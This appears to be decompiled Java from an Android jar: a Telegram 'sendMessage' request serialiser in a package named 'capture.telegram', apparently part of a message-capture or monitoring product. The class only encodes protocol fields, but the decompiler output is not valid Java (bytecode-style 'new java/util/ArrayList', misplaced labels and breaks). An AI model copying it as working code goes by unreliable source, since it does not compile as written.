package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_messages_sendMessage
  extends TLObject
{
  public static int constructor = -91733382;
  public boolean broadcast;
  public ArrayList entities;
  public int flags;
  public String message;
  public boolean no_webpage;
  public TLRPC.InputPeer peer;
  public long random_id;
  public TLRPC.ReplyMarkup reply_markup;
  public int reply_to_msg_id;
  
  public TLRPC$TL_messages_sendMessage()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.entities = localArrayList;
  }
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.Updates.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    boolean bool1 = this.no_webpage;
    if (bool1)
    {
      int j = this.flags | 0x2;
      this.flags = j;
      boolean bool2 = this.broadcast;
      if (!bool2) {
        break label223;
      }
    }
    label223:
    for (int k = this.flags | 0x10;; k = this.flags & 0xFFFFFFEF)
    {
      this.flags = k;
      k = this.flags;
      paramAbstractSerializedData.writeInt32(k);
      Object localObject = this.peer;
      ((TLRPC.InputPeer)localObject).serializeToStream(paramAbstractSerializedData);
      k = this.flags & 0x1;
      if (k != 0)
      {
        k = this.reply_to_msg_id;
        paramAbstractSerializedData.writeInt32(k);
      }
      localObject = this.message;
      paramAbstractSerializedData.writeString((String)localObject);
      long l = this.random_id;
      paramAbstractSerializedData.writeInt64(l);
      k = this.flags & 0x4;
      if (k != 0)
      {
        localObject = this.reply_markup;
        ((TLRPC.ReplyMarkup)localObject).serializeToStream(paramAbstractSerializedData);
      }
      k = this.flags & 0x8;
      if (k == 0) {
        return;
      }
      paramAbstractSerializedData.writeInt32(481674261);
      int m = this.entities.size();
      paramAbstractSerializedData.writeInt32(m);
      k = 0;
      localObject = null;
      for (int n = 0; n < m; n = k)
      {
        localObject = (TLRPC.MessageEntity)this.entities.get(n);
        ((TLRPC.MessageEntity)localObject).serializeToStream(paramAbstractSerializedData);
        k = n + 1;
      }
      k = this.flags & 0xFFFFFFFD;
      break;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_messages_sendMessage.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */